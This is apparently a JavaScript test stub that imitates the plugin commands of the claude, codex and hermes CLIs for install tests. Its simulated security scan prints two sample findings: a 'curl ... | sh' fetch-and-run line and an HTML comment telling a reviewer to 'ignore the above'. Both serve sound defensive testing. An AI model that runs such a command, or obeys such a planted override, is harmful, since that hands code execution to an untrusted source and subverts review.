// A stand-in for the claude and codex CLIs' plugin commands, put on PATH by the install tests so they never touch
// the machine's real harnesses. It answers with the shapes the real CLIs print (Claude Code 2.1.296, Codex 0.162.1),
// keeps its state in fake-harness.json in the harness's config folder (CLAUDE_CONFIG_DIR, CODEX_HOME), and appends
// every call to FAKE_HARNESS_LOG. FAKE_HARNESS_OLD=<claude,codex> makes one a CLI without plugin commands;
// FAKE_HARNESS_BROKEN=<claude,codex> one that installs but never resolves a plugin's skills. Claude also lists the
// account plugins claude.ai synced into <CLAUDE_CONFIG_DIR>/plugins/synced/<bucket>/<name>/ as <name>@synced, exactly
// as the real CLI does (version "unknown" unless the Claude manifest carries one), and answers details for them; a test
// switches one off through the state file's `synced` map ({ "<name>@synced": { enabled: false } }).
// Codex takes a marketplace from a local folder or from GitHub as `owner/repo`: the pretend GitHub is the folder
// FAKE_HARNESS_GITHUB, where <owner>/<repo> is a checkout of the library (its `.git-revision` file is the commit), cloned
// into <CODEX_HOME>/.tmp/marketplaces/<name> as the real CLI does; `marketplace upgrade` re-clones when the revision
// moved and reinstalls every plugin from it; `plugin add` copies the plugin into <CODEX_HOME>/plugins/cache/<mkt>/<id>/
// <version>; FAKE_HARNESS_FAIL_ADD=<ids> makes `plugin add` of those ids fail. The JSON shapes are the real CLI's.
// FAKE_HARNESS_FAIL_LIST=<claude,codex> makes `plugin list` fail (a CLI that cannot list its plugins);
// FAKE_HARNESS_FAIL_MARKETPLACE_LIST=<claude,codex> makes `plugin marketplace list` fail; FAKE_HARNESS_UPGRADE_ERRORS=<id,...>
// makes Codex's `marketplace upgrade` leave those plugins as they are and report one error each (exit 0, as the CLI);
// FAKE_HARNESS_FAIL_UNINSTALL=<id,...> makes `plugin uninstall <id>` (Codex: `plugin remove <id>`) fail for those ids.
// Codex's `debug prompt-input` lists each enabled plugin's skills except those whose agents/openai.yaml sets
// policy.allow_implicit_invocation: false, which the real one loads but keeps out of the model's skill list.
//
// The third host is hermes (`hermes plugins ...`, hermes-agent v0.21.6 shapes). Its state is Hermes's own files under
// HERMES_HOME, the ones the real CLI writes and the tool reads: plugins/<name>/ (copied from a pretend GitHub checkout
// under FAKE_HERMES_GITHUB/<owner>/<repo>/<ref or HEAD>/<subdir>), plugins/.install-metadata.json ({ pinned, revision,
// source: "<url>#<subdir>" } per name) and config.yaml (plugins.enabled, plugins.disabled). `install` refuses a name whose
// plugins/<name> is a link, a --ref that is not a 40-hex sha, and, after the security scan as the real one checks it, an
// existing name without --force (`Error: Plugin '<name>' already exists. ...` on stdout); --force without --ref over a
// pinned row keeps the prior pin, as the real one does; FAKE_HARNESS_FAIL_INSTALL=<names> makes those installs fail;
// FAKE_HARNESS_CAUTION=<names> gives them a caution scan verdict, which without --force and without a TTY blocks (the
// report and refusal printed as the real one prints them) and with --force installs saying nothing of it;
// FAKE_HARNESS_DANGEROUS=<names> a dangerous one, which no flag gets past; FAKE_HARNESS_WRONG_PIN=<names> records those
// installs at ffff... instead of the --ref. What the install prints through Rich wraps at COLUMNS (80 without it); FAKE_HARNESS_FAIL_ENABLE=<names> makes `enable` fail for those names and FAKE_HARNESS_FAIL_LIST
// (with hermes in it) makes `list` fail. `list --json` prints the rows the real CLI prints, a bundled one unless --no-bundled.
import fs from "node:fs";
import path from "node:path";
import {spawnSync} from "node:child_process";
import YAML from "yaml";

const [host, ...args] = process.argv.slice(2);
const has = (v, h) => (v ?? "").split(",").includes(h);
const home = host === "claude" ? process.env.CLAUDE_CONFIG_DIR : host === "hermes" ? process.env.HERMES_HOME : process.env.CODEX_HOME;
const file = path.join(home, "fake-harness.json");
const state = fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, "utf8")) : { marketplaces: {}, plugins: {} };
const save = () => (fs.mkdirSync(home, { recursive: true }), fs.writeFileSync(file, JSON.stringify(state, null, 2)));
if (process.env.FAKE_HARNESS_LOG) fs.appendFileSync(process.env.FAKE_HARNESS_LOG, JSON.stringify([host, ...args]) + "\n");
const out = (v) => process.stdout.write((typeof v === "string" ? v : JSON.stringify(v, null, 2)) + "\n");
const fail = (m) => (process.stderr.write(m + "\n"), process.exit(1));
/**
 * What hermes prints through its Rich console: wrapped, as Rich wraps when stdout is not a terminal, at COLUMNS (80
 * without it), each line broken at the last space that fits.
 */
const rich = (text) => {
  const width = Number.parseInt(process.env.COLUMNS ?? "", 10) || 80;
  return text
    .split("\n")
    .flatMap((line) => {
      const rows = [];
      let row = null;
      for (const word of line.split(" ")) {
        if (row !== null && row.length + 1 + word.length > width) (rows.push(row), (row = word));
        else row = row === null ? word : `${row} ${word}`;
      }
      rows.push(row ?? "");
      return rows;
    })
    .join("\n");
};
const say = (text) => out(rich(text));
/** tools/skills_guard.py format_scan_report: the head line, the findings, a blank line, the decision */
const scanReport = (name, identifier, verdict, findings, decision) =>
  [`Scan: ${name} (${identifier}/community)  Verdict: ${verdict}`, ...findings, "", `Decision: BLOCKED — ${decision}`].join("\n");
/** plugins_cmd._scan_plugin_tree's PluginScanBlocked, as cmd_install prints it (stdout) before it exits 1 */
const blocked = (reason, report) => {
  say(`Blocked: Security scan blocked plugin install: ${reason}\n\n${report}\nReview the findings above. Install only plugins from sources you trust. (Scanning can be configured via plugins.scan_on_install in config.yaml.)`);
  process.exit(1);
};
const words = args.filter((a) => !a.startsWith("-"));
// "plugin marketplace add", "plugin install": the command's words, without its argument
const cmd = words.slice(0, words[1] === "marketplace" ? 3 : 2).join(" ");
// the value of a `--flag value` option, when given
const option = (flag) => (args.includes(flag) ? args[args.indexOf(flag) + 1] : undefined);

if (host === "hermes") {
  hermes();
  process.exit(0);
}

const catalog = (root) =>
  JSON.parse(
    fs.readFileSync(
      path.join(root, host === "claude" ? ".claude-plugin" : ".agents/plugins", "marketplace.json"),
      "utf8",
    ),
  );
const skillsOf = (dir) => {
  const d = path.join(dir, "skills");
  return fs.existsSync(d) ? fs.readdirSync(d).filter((n) => fs.existsSync(path.join(d, n, "SKILL.md"))).sort() : [];
};
/** Codex: does the skill's agents/openai.yaml set policy.allow_implicit_invocation to false. */
const explicitOnly = (skillDir) => {
  try {
    return YAML.parse(fs.readFileSync(path.join(skillDir, "agents", "openai.yaml"), "utf8"))?.policy?.allow_implicit_invocation === false;
  } catch {
    return false;
  }
};
const resolve = (id) => {
  const at = id.lastIndexOf("@");
  const [name, mkt] = [id.slice(0, at), id.slice(at + 1)];
  const root = state.marketplaces[mkt];
  if (!root) fail(host === "codex" ? `Error: plugin \`${name}\` was not found in marketplace \`${mkt}\`` : `marketplace ${mkt} is not configured`);
  const entry = catalog(root).plugins.find((p) => p.name === name);
  if (!entry) fail(host === "codex" ? `Error: plugin \`${name}\` was not found in marketplace \`${mkt}\`` : `plugin ${name} was not found in marketplace ${mkt}`);
  return { name, mkt, dir: path.resolve(root, entry.source) };
};
const codexVersion = (dir) => JSON.parse(fs.readFileSync(path.join(dir, ".codex-plugin", "plugin.json"), "utf8")).version ?? null;
// Codex: where a marketplace was added from; a marketplace registered before this fake knew sources is a local folder
const sourceOf = (name) => state.sources?.[name] ?? { sourceType: "local", source: state.marketplaces[name] };
// the pretend GitHub: <FAKE_HARNESS_GITHUB>/<owner>/<repo> is the clone `owner/repo` or its Git URL would give
const githubClone = (ownerRepo) => {
  const m = /^(?:https:\/\/github\.com\/)?([\w.-]+)\/([\w.-]+?)(?:\.git)?(?:@[\w.-]+)?$/.exec(ownerRepo);
  const base = process.env.FAKE_HARNESS_GITHUB;
  if (!m || !base) return null;
  const dir = path.join(base, m[1], m[2]);
  return fs.existsSync(dir) ? { owner: m[1], repo: m[2], dir } : null;
};
const revisionOf = (clone) => {
  try {
    return fs.readFileSync(path.join(clone, ".git-revision"), "utf8").trim();
  } catch {
    return "0";
  }
};
const snapshotOf = (name) => path.join(home, ".tmp", "marketplaces", name);
const clone = (from, to) => {
  fs.rmSync(to, { recursive: true, force: true });
  fs.mkdirSync(path.dirname(to), { recursive: true });
  fs.cpSync(from, to, { recursive: true });
};
// Codex installs a Git marketplace's plugin into its cache, keyed by the manifest's version, as the real CLI does; a
// local marketplace's plugin is read in place here (the install tests compare paths with the library's built folder)
const codexInstall = (p, enabled) => {
  const version = codexVersion(p.dir);
  let dir = p.dir;
  if (sourceOf(p.mkt).sourceType === "git") {
    dir = path.join(home, "plugins", "cache", p.mkt, p.name, version ?? "unversioned");
    clone(p.dir, dir);
  }
  return { version, enabled, dir, skills: skillsOf(dir) };
};
// the account plugins: every folder under plugins/synced/<bucket>/, the bucket's manifest.json and *.meta.json skipped
const synced = () => {
  const root = path.join(home, "plugins", "synced");
  if (host !== "claude" || !fs.existsSync(root)) return [];
  const out = [];
  for (const bucket of fs.readdirSync(root).sort()) {
    const dir = path.join(root, bucket);
    if (bucket.startsWith(".") || !fs.statSync(dir).isDirectory()) continue;
    for (const name of fs.readdirSync(dir).sort()) {
      const installPath = path.join(dir, name);
      if (name.startsWith(".") || !fs.statSync(installPath).isDirectory()) continue;
      let version = "unknown";
      try {
        version = JSON.parse(fs.readFileSync(path.join(installPath, ".claude-plugin", "plugin.json"), "utf8")).version ?? "unknown";
      } catch {
        /* no Claude manifest, or none with a version */
      }
      const enabled = state.synced?.[`${name}@synced`]?.enabled ?? true;
      out.push({ id: `${name}@synced`, version, scope: "synced", enabled, installPath });
    }
  }
  return out;
};

if (args[0] === "plugin" && args.includes("--help")) {
  if (cmd === "plugin update" && process.env.FAKE_HARNESS_NO_UPDATE) fail("unknown command update");
  if (has(process.env.FAKE_HARNESS_OLD, host)) out(`Usage: ${host} [options] [prompt]`);
  else out(`Usage: ${host} plugin [command]\n\nCommands:\n  install  update  list  marketplace  uninstall\n${has(process.env.FAKE_HARNESS_NO_WRITE_JSON, host) ? "" : "Options:\n  --json  Print machine-readable result"}`);
} else if (has(process.env.FAKE_HARNESS_OLD, host)) {
  fail(`unknown command ${args.join(" ")}`);
} else if (cmd === "plugin marketplace list") {
  if (has(process.env.FAKE_HARNESS_FAIL_MARKETPLACE_LIST, host)) fail("fixture marketplace list failed");
  const rows = Object.entries(state.marketplaces);
  out(
    host === "claude"
      ? rows.map(([name, p]) => ({ name, source: "directory", path: p, installLocation: p }))
      : {
          marketplaces: rows.map(([name, root]) => {
            const { sourceType, source } = sourceOf(name);
            return { name, root, marketplaceSource: { sourceType, source } };
          }),
        },
  );
} else if (cmd === "plugin marketplace add") {
  if (has(process.env.FAKE_HARNESS_NO_WRITE_JSON, host) && args.includes("--json")) fail("unknown option '--json'");
  if (has(process.env.FAKE_HARNESS_FAIL_MARKETPLACE, host)) {
    out("registry provider context");
    fail("fixture registry registration denied");
  }
  let root = path.resolve(words[3]);
  let source = { sourceType: "local", source: root };
  let gh = null;
  if (host === "codex" && !fs.existsSync(root)) {
    // not a folder here: owner/repo (or a Git URL) on the pretend GitHub, snapshotted like the real CLI's git clone
    gh = githubClone(words[3]);
    if (!gh) fail(`Error: failed to clone https://github.com/${words[3].replace(/\.git$/, "")}.git`);
    // the revision is compared only by upgrade, so the first upgrade after an add re-clones (the real CLI does too)
    source = { sourceType: "git", source: `https://github.com/${gh.owner}/${gh.repo}.git`, revision: null };
  }
  const name = catalog(gh ? gh.dir : root).name;
  if (host === "codex" && state.marketplaces[name]) {
    // as codex 0.162.1: the same source again is already added (exit 0, nothing changed); a Git source over a local
    // registration replaces it in place; any other source of the name is refused until the old one is removed
    const prev = sourceOf(name);
    if (prev.sourceType === source.sourceType && prev.source === source.source) {
      out({ marketplaceName: name, installedRoot: state.marketplaces[name], alreadyAdded: true });
      process.exit(0);
    }
    if (!(prev.sourceType === "local" && source.sourceType === "git"))
      fail(`Error: marketplace '${name}' is already added from a different source; remove it before adding this source`);
  }
  if (gh) {
    root = snapshotOf(name);
    clone(gh.dir, root);
  }
  state.marketplaces[name] = root;
  if (host === "codex") (state.sources ??= {})[name] = source;
  save();
  out(host === "claude" ? { outcome: "ok", marketplace: name } : { marketplaceName: name, installedRoot: root, alreadyAdded: false });
} else if (cmd === "plugin marketplace remove") {
  if (has(process.env.FAKE_HARNESS_NO_WRITE_JSON, host) && args.includes("--json")) fail("unknown option '--json'");
  if (!state.marketplaces[words[3]])
    fail(host === "codex" ? `Error: marketplace \`${words[3]}\` is not configured or installed` : `marketplace ${words[3]} is not configured`);
  const root = state.marketplaces[words[3]];
  delete state.marketplaces[words[3]];
  // Claude's remove cascades to the marketplace's plugins; Codex's does not: its [plugins] entries and caches stay
  if (host === "claude")
    for (const id of Object.keys(state.plugins)) if (id.endsWith(`@${words[3]}`)) delete state.plugins[id];
  const source = sourceOf(words[3]);
  if (state.sources) delete state.sources[words[3]];
  save();
  out(host === "claude" ? { outcome: "ok" } : { marketplaceName: words[3], installedRoot: source.sourceType === "git" ? root : null });
} else if (host === "codex" && cmd === "plugin marketplace upgrade") {
  // refresh every Git marketplace named (or all of them): a new revision on the pretend GitHub is cloned over the
  // snapshot and every plugin installed from it is reinstalled from the new snapshot
  const names = words[3] ? [words[3]] : Object.keys(state.marketplaces).filter((n) => sourceOf(n).sourceType === "git");
  const upgraded = [];
  const errors = [];
  for (const name of names) {
    if (!state.marketplaces[name]) fail(`Error: marketplace \`${name}\` is not configured or installed`);
    const src = sourceOf(name);
    if (src.sourceType !== "git") fail(`Error: marketplace \`${name}\` is not configured as a Git marketplace`);
    const gh = githubClone(src.source);
    if (!gh) fail(`Error: failed to fetch ${src.source}`);
    const revision = revisionOf(gh.dir);
    if (revision === src.revision && !process.env.FAKE_HARNESS_UPGRADE_ALWAYS) continue;
    clone(gh.dir, state.marketplaces[name]);
    src.revision = revision;
    state.sources[name] = src;
    upgraded.push(state.marketplaces[name]);
    for (const [id, p] of Object.entries(state.plugins)) {
      if (!id.endsWith(`@${name}`)) continue;
      if (has(process.env.FAKE_HARNESS_UPGRADE_ERRORS, id)) {
        errors.push(`Error: failed to install plugin \`${id}\`: fixture upgrade denied`);
        continue;
      }
      const entry = catalog(state.marketplaces[name]).plugins.find((x) => x.name === id.slice(0, id.lastIndexOf("@")));
      if (!entry) continue; // no longer in the catalog: the cache stays as it was
      state.plugins[id] = codexInstall({ name: entry.name, mkt: name, dir: path.resolve(state.marketplaces[name], entry.source) }, p.enabled);
    }
  }
  save();
  if (args.includes("--json")) out({ selectedMarketplaces: names, upgradedRoots: upgraded, errors });
  else for (const name of names) out(upgraded.includes(state.marketplaces[name]) ? `Upgraded marketplace \`${name}\`.` : `Marketplace \`${name}\` is already up to date.`);
} else if (cmd === "plugin list") {
  if (has(process.env.FAKE_HARNESS_FAIL_LIST, host)) fail("fixture plugin list failed");
  const rows = Object.entries(state.plugins);
  out(
    host === "claude"
      ? [
          ...rows.map(([id, p]) => ({ id, version: p.version, scope: "user", enabled: p.enabled,
            ...(process.env.FAKE_HARNESS_CACHE ? {installPath: p.dir} : {readFromFolder: p.dir}) })),
          ...synced(),
        ]
      : {
          installed: rows.map(([id, p]) => {
            const name = id.slice(0, id.lastIndexOf("@"));
            const mkt = id.slice(id.lastIndexOf("@") + 1);
            const { sourceType, source } = sourceOf(mkt);
            return {
              pluginId: id,
              name,
              marketplaceName: mkt,
              version: p.version ?? null,
              installed: true,
              enabled: p.enabled,
              source: { source: "local", path: p.source ?? p.dir },
              marketplaceSource: { sourceType, source: source ?? null },
              installPolicy: "AVAILABLE",
              authPolicy: "ON_USE",
            };
          }),
          available: [],
        },
  );
} else if ((host === "claude" && ["plugin install", "plugin update"].includes(cmd)) || (host === "codex" && cmd === "plugin add")) {
  if (has(process.env.FAKE_HARNESS_NO_WRITE_JSON, host) && args.includes("--json")) fail("unknown option '--json'");
  if (host === "codex" && has(process.env.FAKE_HARNESS_FAIL_ADD, words[2])) {
    out(`add provider context: ${words[2]}`);
    fail(`Error: fixture add denied: ${words[2]}`);
  }
  const p = resolve(words[2]);
  const at = state.plugins[words[2]];
  // Native Claude install leaves an existing cache untouched; only update rebuilds it.
  if (host === "claude" && cmd === "plugin install" && at) {
    out({ outcome: "ok", message: "already installed" });
    process.exit(0);
  }
  if (cmd === "plugin update") {
    if (has(process.env.FAKE_HARNESS_FAIL_UPDATE, words[2])) {
      out(`update provider context: ${words[2]}`);
      fail(`fixture update denied: ${words[2]}`);
    }
    if (process.env.FAKE_HARNESS_STALE_UPDATE) {
      out({ outcome: "ok", message: "already up to date" });
      process.exit(0);
    }
  }
  if (host === "codex") {
    // idempotent: a second add answers the same JSON
    const installed = codexInstall(p, at?.enabled ?? true);
    state.plugins[words[2]] = { ...installed, source: p.dir };
    save();
    out({ pluginId: words[2], name: p.name, marketplaceName: p.mkt, version: installed.version, installedPath: installed.dir, authPolicy: "ON_USE" });
    process.exit(0);
  }
  const version = process.env.FAKE_HARNESS_CACHE
        ? spawnSync("git", ["-C", state.marketplaces[p.mkt], "rev-parse", "--short=12", "HEAD"], {encoding:"utf8"}).stdout.trim()
        : "c69993a67bba";
  let dir = p.dir;
  if (process.env.FAKE_HARNESS_CACHE) {
    dir = path.join(home, "cache", p.mkt, p.name, version);
    fs.cpSync(p.dir, dir, { recursive: true });
  }
  state.plugins[words[2]] = {
    version,
    enabled: cmd === "plugin update" && process.env.FAKE_HARNESS_DISABLED_UPDATE ? false : at?.enabled ?? true,
    dir,
    skills: skillsOf(dir),
  };
  save();
  out({ outcome: "ok", pluginId: words[2] });
} else if ((host === "claude" && cmd === "plugin uninstall") || (host === "codex" && cmd === "plugin remove")) {
  if (has(process.env.FAKE_HARNESS_NO_WRITE_JSON, host) && args.includes("--json")) fail("unknown option '--json'");
  if (has(process.env.FAKE_HARNESS_FAIL_UNINSTALL, words[2])) fail(`fixture uninstall denied: ${words[2]}`);
  if (!state.plugins[words[2]]) fail(`plugin ${words[2]} not found in installed plugins`);
  const p = state.plugins[words[2]];
  delete state.plugins[words[2]];
  save();
  if (host === "codex") {
    // removes the [plugins] entry and the cache version folder
    if (p.dir && p.dir.startsWith(path.join(home, "plugins", "cache"))) fs.rmSync(p.dir, { recursive: true, force: true });
    const at = words[2].lastIndexOf("@");
    out({ pluginId: words[2], name: words[2].slice(0, at), marketplaceName: words[2].slice(at + 1) });
  } else out({ outcome: "ok" });
} else if (host === "claude" && cmd === "plugin details") {
  if (has(process.env.FAKE_HARNESS_FAIL_DETAILS, args[2])) fail(`fixture details failed: ${args[2]}`);
  const account = synced().find((s) => s.id === words[2]);
  const p = state.plugins[words[2]] ?? (account ? { dir: account.installPath } : null);
  if (!p) fail(`Plugin "${words[2]}" not found.`);
  const skills = has(process.env.FAKE_HARNESS_BROKEN, host) ? [] : skillsOf(p.dir);
  out(`${words[2]}\n\nComponent inventory\n  Skills (${skills.length})  ${skills.join(", ")}\n  Agents (0)`);
} else if (host === "codex" && args[0] === "debug" && args[1] === "prompt-input") {
  if (has(process.env.FAKE_HARNESS_FAIL_PROMPT, host)) fail("fixture prompt inventory failed");
  const lines = [];
  let rootIndex = 0;
  if (!has(process.env.FAKE_HARNESS_BROKEN, host))
    for (const [id, p] of Object.entries(state.plugins)) {
      if (!p.enabled) continue;
      const alias = `r${rootIndex++}`;
      if (process.env.FAKE_HARNESS_ALIASES) lines.push(`- \`${alias}\` = \`${path.join(p.dir, "skills")}\``);
      // as the real one, a skill whose agents/openai.yaml sets policy.allow_implicit_invocation: false is loaded but kept
      // out of the model's skill list (codex-rs ext/skills/src/provider/host.rs: hidden_from_prompt)
      for (const s of skillsOf(p.dir).filter((s) => !explicitOnly(path.join(p.dir, "skills", s)))) lines.push(`- ${id.slice(0, id.lastIndexOf("@"))}:${s}: ${s} skill (file: ${process.env.FAKE_HARNESS_ALIASES ? alias + "/" + s + "/SKILL.md" : path.join(p.dir, "skills", s, "SKILL.md")})`);
    }
  out(JSON.stringify([{ type: "message", content: [{ text: `### Available skills\n${lines.join("\n")}` }] }]));
} else fail(`fake ${host}: unhandled ${args.join(" ")}`);

/** hermes plugins list|install|enable|disable|update|remove, on Hermes's real files under HERMES_HOME. */
function hermes() {
  const pluginsDir = path.join(home, "plugins");
  const metaFile = path.join(pluginsDir, ".install-metadata.json");
  const configFile = path.join(home, "config.yaml");
  const readMeta = () => (fs.existsSync(metaFile) ? JSON.parse(fs.readFileSync(metaFile, "utf8")) : {});
  // the real CLI writes sort_keys=True, indent 2
  const writeMeta = (m) => {
    fs.mkdirSync(pluginsDir, { recursive: true });
    const sorted = Object.fromEntries(Object.entries(m).sort(([a], [b]) => (a < b ? -1 : 1)).map(([k, v]) => [k, Object.fromEntries(Object.entries(v).sort())]));
    fs.writeFileSync(metaFile, JSON.stringify(sorted, null, 2) + "\n");
  };
  const readConfig = () => {
    try {
      return YAML.parse(fs.readFileSync(configFile, "utf8")) ?? {};
    } catch {
      return {};
    }
  };
  const lists = () => {
    const p = readConfig().plugins ?? {};
    return { enabled: new Set(p.enabled ?? []), disabled: new Set(p.disabled ?? []) };
  };
  const setLists = (name, enable) => {
    const c = readConfig();
    c.plugins ??= {};
    const en = new Set(c.plugins.enabled ?? []);
    const dis = new Set(c.plugins.disabled ?? []);
    if (enable === null) (en.delete(name), dis.delete(name));
    else ((enable ? dis : en).delete(name), (enable ? en : dis).add(name));
    c.plugins.enabled = [...en].sort();
    c.plugins.disabled = [...dis].sort();
    fs.mkdirSync(home, { recursive: true });
    fs.writeFileSync(configFile, YAML.stringify(c));
  };
  const manifestOf = (dir) => {
    try {
      return JSON.parse(fs.readFileSync(path.join(dir, "plugin.json"), "utf8"));
    } catch {
      return null;
    }
  };
  const isLink = (p) => {
    try {
      const st = fs.lstatSync(p);
      if (st.isSymbolicLink()) return true;
      if (process.platform === "win32" && st.isDirectory()) return (fs.readlinkSync(p), true);
      return false;
    } catch {
      return false;
    }
  };
  // every user plugin folder, as _discover_all_plugins lists them: (name, version, description, source, dir)
  const discovered = () =>
    fs.existsSync(pluginsDir)
      ? fs
          .readdirSync(pluginsDir)
          .sort()
          .filter((n) => !n.startsWith(".") && fs.statSync(path.join(pluginsDir, n)).isDirectory())
          .map((n) => {
            const dir = path.join(pluginsDir, n);
            const m = manifestOf(dir) ?? {};
            return { folder: n, dir, name: m.name ?? n, version: m.version, description: m.description ?? "" };
          })
      : [];
  const find = (name) => discovered().find((p) => p.name === name || p.folder === name);
  const status = (name) => {
    const l = lists();
    return l.disabled.has(name) ? "disabled" : l.enabled.has(name) ? "enabled" : "not enabled";
  };
  const github = process.env.FAKE_HERMES_GITHUB;

  if (args[0] === "plugins" && args.includes("--help")) {
    out("usage: hermes plugins [-h] {list,search,install,enable,disable,update,remove,show,capabilities} ...");
  } else if (cmd === "plugins list") {
    if (has(process.env.FAKE_HARNESS_FAIL_LIST, host)) fail("fixture plugin list failed");
    const meta = readMeta();
    const rows = discovered().map((p) => {
      const pin = meta[p.name]?.pinned === true && typeof meta[p.name].revision === "string" ? meta[p.name].revision : null;
      return {
        name: p.name,
        status: status(p.name),
        // manifest.get("version", ""): an empty string for a manifest without one
        version: p.version === undefined ? "" : String(p.version),
        description: p.description,
        source: pin ? `git pinned@${pin.slice(0, 8)}` : "user",
        removed: null,
      };
    });
    if (!args.includes("--no-bundled"))
      rows.unshift({ name: "memory-wiki", status: "not enabled", version: "0.1.0", description: "Markdown wiki memory", source: "bundled", removed: null });
    // the bundled rows are always there, so the "No plugins installed." text shows only without --no-bundled; the
    // filtered-out list is an empty JSON list
    if (!rows.length && !args.includes("--no-bundled")) {
      out("No plugins installed.");
      out("Install with: hermes plugins install owner/repo");
    } else if (args.includes("--json")) out(JSON.stringify(rows, null, 2));
    else if (args.includes("--plain")) for (const r of rows) out(`${r.status.padEnd(12)} ${r.source.padEnd(8)} ${r.version.padEnd(8)} ${r.name}`);
    else {
      out("\n Plugins ");
      for (const r of rows) out(` ${r.name}  ${r.status}  ${r.version}  ${r.description}  ${r.source}`);
      out("\nCompact view: hermes plugins list --plain --no-bundled");
    }
  } else if (cmd === "plugins install") {
    const identifier = words[2];
    if (!identifier) fail("usage: hermes plugins install <identifier>");
    if (!github) fail("fake hermes: FAKE_HERMES_GITHUB is not set");
    const ref = option("--ref");
    if (args.includes("--ref") && !/^[0-9a-f]{40}$/i.test(ref ?? "")) fail("--ref must be a full 40-character commit SHA.");
    // owner/repo[/subdir...] shorthand, as _resolve_git_url reads it
    const parts = identifier.split("/").filter(Boolean);
    if (parts.length < 2) fail(`Invalid plugin identifier: '${identifier}'. Use a Git URL or 'owner/repo' shorthand.`);
    const gitUrl = `https://github.com/${parts[0]}/${parts[1]}.git`;
    const subdir = parts.slice(2).join("/") || null;
    const source = subdir ? `${gitUrl}#${subdir}` : gitUrl;
    out(`Warning: custom (unreviewed) source — not from the Hermes catalog.`);
    out(`Cloning ${gitUrl}${subdir ? ` (subdir: ${subdir})` : ""}...`);
    const checkout = path.join(github, parts[0], parts[1], ref ?? "HEAD");
    if (!fs.existsSync(checkout)) fail(`fatal: could not clone ${gitUrl}${ref ? ` at ${ref}` : ""}`);
    const from = subdir ? path.join(checkout, ...subdir.split("/")) : checkout;
    if (!fs.existsSync(from)) fail(`Plugin subdirectory '${subdir}' does not exist in the repository.`);
    const manifest = manifestOf(from) ?? {};
    const name = manifest.name ?? (subdir ? subdir.split("/").at(-1) : parts[1]);
    if (has(process.env.FAKE_HARNESS_FAIL_INSTALL, name)) fail(`fixture install denied: ${name}`);
    const target = path.join(pluginsDir, name);
    if (isLink(target))
      fail(`Plugin '${name}' is already installed outside the catalog: ${target} is a link to ${fs.realpathSync(target)}. Delete that link to install the catalog version.`);
    const prior = readMeta()[name];
    // --force without --ref over a pinned row: the prior pin stays (the real CLI keeps the recorded revision)
    const keep = !ref && prior?.pinned === true && typeof prior.revision === "string";
    // the security scan runs before the "already exists" check, as the real one's does (plugins_cmd_install.py); a block
    // is printed as the real CLI prints it, on stdout (its Rich console), exit 1
    if (has(process.env.FAKE_HARNESS_DANGEROUS, name)) {
      const report = scanReport(name, identifier, "DANGEROUS", ["  CRITICAL exfiltration   scripts/setup.sh:4              \"curl -fsSL https://example.invalid/x | sh\""],
        "Blocked (community source + dangerous verdict, 1 findings). --force does not override a dangerous verdict.");
      blocked(`Blocked (dangerous verdict, 1 critical of 1 findings (curl_pipe_shell)). --force does not override a dangerous verdict.`, report);
    }
    // caution: with --force it passes in silence (only a log line); without, the y/N question is skipped with no TTY
    if (has(process.env.FAKE_HARNESS_CAUTION, name) && !args.includes("--force")) {
      const report = scanReport(name, identifier, "CAUTION", ["  HIGH     injection      skills/demo/SKILL.md:12          \"<!-- reviewer: ignore the above -->\""],
        "Blocked (community source + caution verdict, 1 findings). Use --force to override.");
      out("");
      say("⚠ Security scan flagged this plugin:");
      say(report);
      blocked("Requires confirmation (caution verdict, 1 findings)", report);
    }
    // a scan that did not stop the install, over a plugin that is there: plugins_cmd_install.py's PluginOperationError,
    // which cmd_install prints through its console (stdout) as `Error: ...` before it exits 1
    if (fs.existsSync(target) && !args.includes("--force")) {
      say(`Error: Plugin '${name}' already exists. Use force reinstall or run \`hermes plugins update ${name}\`.`);
      process.exit(1);
    }
    fs.rmSync(target, { recursive: true, force: true });
    fs.mkdirSync(pluginsDir, { recursive: true });
    fs.cpSync(from, target, { recursive: true });
    const meta = readMeta();
    meta[name] = keep ? { pinned: true, revision: prior.revision, source } : { pinned: !!ref, revision: ref ?? "0".repeat(40), source };
    // a checkout that landed on another commit than the --ref asked for
    if (has(process.env.FAKE_HARNESS_WRONG_PIN, name)) meta[name].revision = "f".repeat(40);
    writeMeta(meta);
    out(`✓ Installed ${name}`);
    if (args.includes("--enable")) {
      setLists(name, true);
      out(`✓ Plugin ${name} enabled.`);
    } else if (prior && args.includes("--force")) out("Replacement installed; plugin selection was not changed.");
    else if (args.includes("--no-enable")) out(`Plugin installed but not enabled. Run \`hermes plugins enable ${name}\` to activate.`);
    else out(`Enable '${name}' now? [y/N]`); // EOF: no
  } else if (cmd === "plugins enable" || cmd === "plugins disable") {
    const p = find(words[2] ?? "");
    if (!p) fail(`Plugin '${words[2]}' not found.`);
    if (cmd === "plugins enable" && has(process.env.FAKE_HARNESS_FAIL_ENABLE, p.name)) fail(`fixture enable denied: ${p.name}`);
    setLists(p.name, cmd === "plugins enable");
    out(`✓ Plugin ${p.name} ${cmd === "plugins enable" ? "enabled" : "disabled"}.`);
  } else if (cmd === "plugins update") {
    const p = find(words[2] ?? "");
    if (!p) fail(`Plugin '${words[2]}' not found.`);
    const rec = readMeta()[p.name];
    if (rec?.pinned === true)
      fail(`Plugin '${p.name}' is pinned to ${rec.revision}. To move it, run \`hermes plugins install ${rec.source} --force --ref <sha>\`.`);
    out(`✓ Plugin ${p.name} is already up to date.`);
  } else if (cmd === "plugins remove") {
    const p = find(words[2] ?? "");
    if (!p) fail(`Plugin '${words[2]}' not found.`);
    fs.rmSync(p.dir, { recursive: true, force: true });
    const meta = readMeta();
    delete meta[p.name];
    writeMeta(meta);
    setLists(p.name, null);
    out(`✗ Plugin ${p.name} removed from ${pluginsDir}`);
  } else fail(`fake hermes: unhandled ${args.join(" ")}`);
}
